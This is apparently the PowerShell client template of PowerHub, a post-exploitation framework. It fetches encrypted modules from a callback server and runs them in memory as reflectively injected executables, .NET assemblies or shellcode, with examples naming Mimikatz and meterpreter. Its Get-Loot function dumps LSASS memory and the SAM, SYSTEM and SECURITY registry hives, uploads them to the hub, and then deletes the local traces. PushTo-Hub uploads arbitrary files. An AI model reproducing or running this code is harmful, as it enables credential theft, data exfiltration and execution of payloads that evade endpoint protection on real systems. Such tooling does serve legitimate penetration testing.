Write-Output @"
  _____   _____  _  _  _ _______  ______ _     _ _     _ ______
 |_____] |     | |  |  | |______ |_____/ |_____| |     | |_____]
 |       |_____| |__|__| |______ |    \_ |     | |_____| |_____]
                            written by Adrian Vollmer, 2018-2019
Run 'Help-PowerHub' for help
"@

$CALLBACK_URL = ${{symbol_name("CALLBACK_URL")}}
$KEY = ${{symbol_name("KEY")}}
Set-Alias -Name Decrypt-Code -Value {{symbol_name("Decrypt-Code")}}

$WEBDAV_URL = "{{webdav_url}}"
$ErrorActionPreference = "Stop"
$PS_VERSION = $PSVersionTable.PSVersion.Major
{{'$DebugPreference = "Continue"'|debug}}

$Modules = @()
{% if modules %}
{% for m in modules %}
$m = new-object System.Collections.Hashtable
$m.add('name', '{{ m.name }}')
$m.add('shortname', '{{ m.short_name }}')
$m.add('type', '{{ m.type }}')
$m.add('code', '')
$m.add('n', {{ m.n }})
$Modules += $m
{% endfor %}
{% endif %}

function Unzip-Code {
     Param ( [byte[]] $byteArray )
     if ($PS_VERSION -eq 2) {
        $byteArray
     } else {
         $input = New-Object System.IO.MemoryStream( , $byteArray )
         $output = New-Object System.IO.MemoryStream
         $gzipStream = New-Object System.IO.Compression.GzipStream $input, ([IO.Compression.CompressionMode]::Decompress)
         $gzipStream.CopyTo( $output )
         $gzipStream.Close()
         $input.Close()
         [byte[]] $byteOutArray = $output.ToArray()
         $byteOutArray
    }
}


function Import-HubModule {

    Param(
        [parameter(Mandatory=$true)]
        $Module
    )

    if ($Module["type"] -eq "ps1") {
        $code = $Module["code"]
        $code = [System.Convert]::FromBase64String($code)
        $code = Decrypt-Code $code $KEY
        $code = Unzip-Code $code
        $code = [System.Text.Encoding]::ASCII.GetString($code)
        $sb = [Scriptblock]::Create($code)
        New-Module -ScriptBlock $sb | Out-Null
    }

    if ($?){
        Write-Verbose ("[*] {0} imported." -f $Module["name"])
    } else {
        Write-Error ("[*] Failed to import {0}" -f $Module["name"])
    }
}


function Convert-IntStringToArray ($s) {
    $no = $s.Split(",")
    $indices = @()
    foreach ($t in $no) {
        $limits = $t.Split("-")
        if ($limits.Length -eq 1) {
            $indices += $limits[0]
        } else {
            if (-not $limits[0]) { $limits[0] = 0}
            if (-not $limits[1]) { $limits[1] = $Modules.length-1}
            $indices += $limits[0] .. $limits[1]
        }
    }
    $indices
}

function List-HubModules {
<#
.SYNOPSIS

Lists all modules that are available via the hub.

#>
    $(foreach ($ht in $Modules) {
        new-object PSObject -Property $ht
    } ) | Format-Table -AutoSize -Property n,type,name,code
}

function Load-HubModule {

<#
.SYNOPSIS

Transfers a module from the hub and imports it. It creates a web request to
load the Base64 encoded module code.

.DESCRIPTION

Load-HubModule loads a module.

.PARAMETER s

Number of the module, separated by commas. Can contain a range such as "1,4-8".
Try a leading zero in case it is not working.

Alternatively, provide a regular expression. PowerHub will then load all
modules that match.

.EXAMPLE

Load-HubModule "3"

Description
-----------
Transfers the code of module #3 from the hub and imports it.

.EXAMPLE

Load-HubModule Mimikatz

Description
-----------
Transfers the code of module 'Invoke-Mimikatz.ps1' (because the regular
expression matches) from the hub and imports it.

.EXAMPLE

Load-HubModule "1,4-6"

Description
-----------
Transfers the code of modules #1, #4, #5 and #6 from the hub and imports them.

.EXAMPLE

Load-HubModule "-"

Description
-----------
Transfers the code of all modules from the hub and imports them.

.NOTES

Use the '-Verbose' option to print detailed information.
#>

    Param(
        [parameter(Mandatory=$true)]
        [String]
        $s
    )

    if ($s -match "^[0-9-,]+$") {
        $indices = Convert-IntStringToArray($s)
    } else {
        $indices = $Modules | Where { $_.shortname -match $s } | % {$_.n}
    }

    $K=new-object net.webclient;
    $K.proxy=[Net.WebRequest]::GetSystemWebProxy();
    $K.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;
    $result = @()
    foreach ($i in $indices) {
        if ($i -lt $Modules.length -and $i -ge 0) {
            $compression = "&c=1"
            if ($PS_VERSION -eq 2) { $compression = "" }
            $url = "{0}m?m={1}{2}" -f $CALLBACK_URL, $i, $compression
            $Modules[$i]["code"] = $K.downloadstring($url);
            Import-HubModule $Modules[$i]
        }
        $result += $Modules[$i]
    }
    $result
}


function Run-Exe {
<#
.SYNOPSIS

Executes a loaded exe module in memory using Invoke-ReflectivePEInjection, which must be loaded first.

.PARAMETER Module

An integer reference the module to execute or the module object itself. Use List-HubModules to find this integer.

.PARAMETER ExeArgs

A string containing arguments which are passed to the exe module.

.PARAMETER OnDisk

If this switch is enabled, the exe module will be copied to disk and executed conventionally.

WARNING: Endpoint protection WILL catch malware this way.

.EXAMPLE

Run-Exe 47

Description
-----------

Execute the exe module 47 in memory

.EXAMPLE

Load-HubModule meterpreter.exe | Run-Exe

Description
-----------

Load the exe module with the name 'meterpreter.exe' in memory and run it
#>
    Param(
        [parameter(Mandatory=$true,Position=0,ValueFromPipeline=$true)] $Module,
        [parameter(Mandatory=$false,Position=1)] [String] $ExeArgs,
        [parameter(Mandatory=$false)] [Switch] $OnDisk
    )

    if ($OnDisk) {
        foreach ($n in $Module) {
            $Filename = Save-HubModule $n -Directory $env:TMP
            if ($ExeArgs) {
                Start-Process -FilePath "$Filename" -ArgumentList "$ExeArgs"
            } else {
                Start-Process -FilePath "$Filename"
            }
        }
    } else {
        if (Get-Command "Invoke-ReflectivePEInjection" -errorAction SilentlyContinue) {
            foreach ($n in $Module) {
                if ($n.gettype() -eq [Int32]) {
                    $code = $Modules[$n]["code"]
                } else {
                    $code = $n["code"]
                }
                $code = [System.Convert]::FromBase64String($code)
                $code = Decrypt-Code $code $KEY
                $code = Unzip-Code $code
                Invoke-ReflectivePEInjection -PEBytes $code -ForceASLR -ExeArgs $ExeArgs
            }
        } else {
            Write-Error "[-] PowerSploit's Invoke-ReflectivePEInjection not available. You need to load it first."
        }
    }
}

function Save-HubModule {
<#
.SYNOPSIS

Saves a loaded module to disk. WARNING: This will most likely trigger endpoint protection!

.EXAMPLE

Save-HubModule 41 -Directory tmp/

Description
-----------
Save module 41 to directory tmp/

.EXAMPLE

Load-HubModule meterpreter.exe | Save-HubModule

Description
-----------

Load the exe module with the name 'meterpreter.exe' in memory and save it to disk
#>
    Param(
        [parameter(Mandatory=$true,Position=0,ValueFromPipeline=$true)] $Module,
        [parameter(Mandatory=$false,Position=1)] $Directory = ""
    )

    foreach ($n in $Module) {
        if ($n.gettype() -eq [Int32]) {
            $m = $Modules[$n]
        } else {
            $m = $n
        }
        $code = $m["code"]
        $code = [System.Convert]::FromBase64String($code)
        $code = Decrypt-Code $code $KEY
        $code = Unzip-Code $code
        if ($Directory) {
            $Filename = "$Directory/$($m['shortname'])"
        } else {
            $Filename = $m["shortname"]
        }
        $code | Set-Content "$Filename" -Encoding Byte
        $Filename
    }
}

function Run-DotNETExe {
<#
.SYNOPSIS

Executes a .NET exe module in memory, which must be loaded first.

.EXAMPLE

Load-HubModule SeatBelt
Run-DotNETExe 47 "system"

Description
-----------
Load and execute the .NET binary 47 in memory with the parameter "system"

.EXAMPLE

Load-HubModule meterpreter.exe | Run-DotNETExe

Description
-----------

Load the .NET module with the name 'meterpreter.exe' in memory and run it
#>

    Param(
        [parameter(Mandatory=$true,Position=0,ValueFromPipeline=$true)] $Module,
        [parameter(Mandatory=$false)] [String[]] $Arguments
    )

    foreach ($n in $Module) {
        if ($n.gettype() -eq [Int32]) {
            $m = $Modules[$n]
        } else {
            $m = $n
        }
        $code = $m["code"]
        $code = [System.Convert]::FromBase64String($code)
        $code = Decrypt-Code $code $KEY
        $code = Unzip-Code $code
        $a = [Reflection.Assembly]::Load([byte[]]$code)
        $al = New-Object -TypeName System.Collections.ArrayList
        $al.add($Arguments)
        $a.EntryPoint.Invoke($Null, $al.ToArray());
    }
}


function Run-Shellcode {
<#
.SYNOPSIS

Executes a loaded shellcode module in memory using Invoke-Shellcode, which must be loaded first.

.EXAMPLE

Run-Shellcode 47

Description
-----------
Execute the shellcode module 47 in memory

.EXAMPLE

Load-HubModule meterpreter.bin | Run-Shellcode

Description
-----------

Load the shellcode module with the name 'meterpreter.bin' in memory and run it
#>
    Param(
        [parameter(Mandatory=$true,Position=0,ValueFromPipeline=$true)] $Module,
        [ValidateNotNullOrEmpty()] [UInt16] $ProcessID
    )

    if (Get-Command "Invoke-Shellcode" -errorAction SilentlyContinue)
    {
        foreach ($n in $Module) {
            if ($n.gettype() -eq [Int32]) {
                $m = $Modules[$n]
            } else {
                $m = $n
            }
            $code = $m["code"]
            $code = [System.Convert]::FromBase64String($code)
            $code = Decrypt-Code $code $KEY
            $code = Unzip-Code $code
            if ($ProcessID) {
                Invoke-Shellcode -Shellcode $code -ProcessID $ProcessID
            } else {
                Invoke-Shellcode -Shellcode $code
            }
        }
    } else {
        Write-Error "[-] PowerSploit's Invoke-Shellcode not available. You need to load it first."
    }
}


function Send-File {
    Param(
       [Parameter(Mandatory=$True,Position=0)]
       [Byte[]]$Body,

       [Parameter(Mandatory=$False,Position=1)]
       [String[]]$FileName,

       [Parameter(Mandatory=$False)]
       [Switch] $IsLoot
    )

    if ($FileName) {
        # remove path
        try {
            $FileName = (Get-Item $Filename).Name
        } catch [System.Management.Automation.ItemNotFoundException] {
            $FileName = $FileName.Replace('^.', '').Replace('\', '_')
        }
    } else {
        $FileName = Get-Date -Format o
    }

    $boundary = [System.Guid]::NewGuid().ToString()
    $LF = "`r`n"

    $prebody = (
        "--$boundary",
        "Content-Disposition: form-data; name=`"file[]`"; filename=`"$FileName`"",
        "Content-Type: application/octet-stream$LF$LF"
    ) -join $LF
    $postbody = "$LF--$boundary--$LF"
    $prebody = [System.Text.Encoding]::UTF8.GetBytes($prebody)
    $postbody = [System.Text.Encoding]::UTF8.GetBytes($postbody)

    $post_url = $($CALLBACK_URL + "u?noredirect=1")
    if ($IsLoot) { $post_url += "&loot=1" }
    {{'Write-Debug "POSTing the file to $post_url..."'|debug}}
    $WebRequest = [System.Net.WebRequest]::Create($post_url)
    $WebRequest.Method = "POST"
    $WebRequest.ContentType = "multipart/form-data; boundary=`"$boundary`""
    $WebRequest.Proxy = [System.Net.WebRequest]::GetSystemWebProxy()
    $PostStream = $WebRequest.GetRequestStream()
    $PostStream.Write($prebody, 0, $prebody.Length)
    $PostStream.Write($Body, 0, $Body.Length)
    $PostStream.Write($postbody, 0, $postbody.Length)
    $PostStream.Close()
    {{'Write-Debug "Bytes sent: $($Body.Length)"'|debug}}
    {{'Write-Debug "Reading response"'|debug}}
    try {
        $Response = $WebRequest.GetResponse()
    } catch {}
}


function PushTo-Hub {
<#
.SYNOPSIS

Uploads files back to the hub via Cmdlet.

.EXAMPLE

PushTo-Hub kerberoast.txt, users.txt

Description
-----------
Upload the files 'kerberoast.txt' and 'users.txt' via HTTP back to the hub.

.EXAMPLE

Get-ChildItem | PushTo-Hub -Name "directory-listing"

#>
    Param(
       [Parameter(Mandatory=$False)]
       [String[]]$Files,

       [Parameter(Mandatory=$False)]
       [String[]]$Name,

       [Parameter(Mandatory=$false)]
       [Switch] $IsLoot,

       [Parameter(Mandatory=$False,ValueFromPipeline=$True)]
       $Stream
    )

    begin {
        $result = @()
    }
    process {
        $result = $result + $Stream
    }
    end {
        if ($result) {
            {{'Write-Debug "Pushing stdin stream..."'|debug}}
            if ($result.length -eq 1 -and $result[0] -is [System.String]) {
                $Body = [system.Text.Encoding]::UTF8.GetBytes($result[0])
                Send-File $Body $Name
            } else {
                $Body = $result | ConvertTo-Json
                $Body = [system.Text.Encoding]::UTF8.GetBytes($Body)
                Send-File $Body $Name
            }
        } else {
            ForEach ($file in $Files) {
                {{'Write-Debug "Pushing $File..."'|debug}}
                $abspath = (Resolve-Path $file).path
                $fileBin = [System.IO.File]::ReadAllBytes($abspath)
                if ($Name) { $filename = $name } else { $filename = $file }

                Send-File $fileBin $filename

            }
        }
    }
}

$global:WebdavLetter = $Null
$global:WebdavRoLetter = $Null

function Mount-Webdav {
<#
.SYNOPSIS

Mount the Webdav drive.

.PARAMETER RoLetter

The letter the mounted read-only drive will receive (default: 'R')

.PARAMETER Letter

The letter the mounted public drive will receive (default: 'S')

#>
    Param(
        [parameter(Mandatory=$False)]
        [String]$Letter = "S",
        [parameter(Mandatory=$False)]
        [String]$RoLetter = "R"
    )
    Set-Variable -Name "WebdavLetter" -Value "$Letter" -Scope Global
    Set-Variable -Name "WebdavRoLetter" -Value "$RoLetter" -Scope Global
    {{'Write-Debug "Mounting $WEBDAV_URL to $LETTER"'|debug}}
    $netout = iex "net use ${Letter}: $WEBDAV_URL /persistent:no 2>&1" | Out-Null
    {{'Write-Debug "Mounting ${WEBDAV_URL}_ro to $RoLETTER"'|debug}}
    $netout = iex "net use ${RoLetter}: ${WEBDAV_URL}_ro /persistent:no 2>&1" | Out-Null
    if (!$?) {
        throw "Error while executing 'net use': $netout"
    }
}


function Unmount-Webdav {
<#
.SYNOPSIS

Unmount the Webdav drive.

#>
    If (${WebdavLetter}) {
        $netout = iex "net use ${WebdavLetter}: /delete 2>&1" | Out-Null
        $netout = iex "net use ${WebdavRoLetter}: /delete 2>&1" | Out-Null
        if (!$?) {
            throw "Error while executing 'net use': $netout"
        }
    } else {
        throw "No Webdav drive mounted"
    }
}


function Get-Loot {
<#
.SYNOPSIS

Grab credentials from the hard drive and from memory.

Partially based on:
    PowerSploit Function: Out-Minidump
    Author: Matthew Graeber (@mattifestation)
    License: BSD 3-Clause
#>

    $SamPath = Join-Path $env:TMP "sam"
    $SystemPath = Join-Path $env:TMP "system"
    $SecurityPath = Join-Path $env:TMP "security"
    $SoftwarePath = Join-Path $env:TMP "software"
    $DumpFilePath = $env:TMP

    $Process = Get-Process lsass
    $ProcessId = $Process.Id
    $ProcessName = $Process.Name
    $ProcessHandle = $Process.Handle
    $ProcessFileName = "$($ProcessName)_$($ProcessId).dmp"
    $ProcessDumpPath = Join-Path $DumpFilePath $ProcessFileName

    $WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')
    $WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic')
    $Flags = [Reflection.BindingFlags] 'NonPublic, Static'
    $MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags)
    $MiniDumpWithFullMemory = [UInt32] 2

    try {
        & reg save HKLM\SAM $SamPath /y
        & reg save HKLM\SYSTEM $SystemPath /y
        & reg save HKLM\SECURITY $SecurityPath /y
        & reg save HKLM\SOFTWARE $SoftwarePath /y

        $FileStream = New-Object IO.FileStream($ProcessDumpPath, [IO.FileMode]::Create)
        $Result = $MiniDumpWriteDump.Invoke($null, @($ProcessHandle,
                                                     $ProcessId,
                                                     $FileStream.SafeFileHandle,
                                                     $MiniDumpWithFullMemory,
                                                     [IntPtr]::Zero,
                                                     [IntPtr]::Zero,
                                                     [IntPtr]::Zero))
        $FileStream.Close()

        Foreach ($f in $ProcessDumpPath, $SamPath, $SystemPath, $SecurityPath, $SoftwarePath) {
            if (Test-Path $f) { PushTo-Hub -IsLoot $f }
        }
    } finally {
        Foreach ($f in $ProcessDumpPath, $SamPath, $SystemPath, $SecurityPath, $SoftwarePath) {
            try { Remove-Item -Force $f} catch {}
        }
    }
}


function Help-PowerHub {
    Write-Host @"
The following functions are available (some with short aliases):
  * List-HubModules (lshm)
  * Load-HubModule (lhm)
  * Run-Exe (re)
  * Run-DotNETExe (rdne)
  * Run-Shellcode (rsh)
  * PushTo-Hub (pth)
  * Mount-Webdav (mwd)
  * Unmount-Webdav (uwd)

Use 'Get-Help' to learn more about those functions.
"@
}

try { New-Alias -Name pth -Value PushTo-Hub } catch { }
try { New-Alias -Name lhm -Value Load-HubModule } catch { }
try { New-Alias -Name lshm -Value List-HubModules } catch { }
try { New-Alias -Name re -Value Run-Exe } catch { }
try { New-Alias -Name rdne -Value Run-DotNETExe } catch { }
try { New-Alias -Name rsh -Value Run-Shellcode } catch { }
try { New-Alias -Name mwd -Value Mount-Webdav } catch { }
try { New-Alias -Name umwd -Value Unmount-Webdav } catch { }
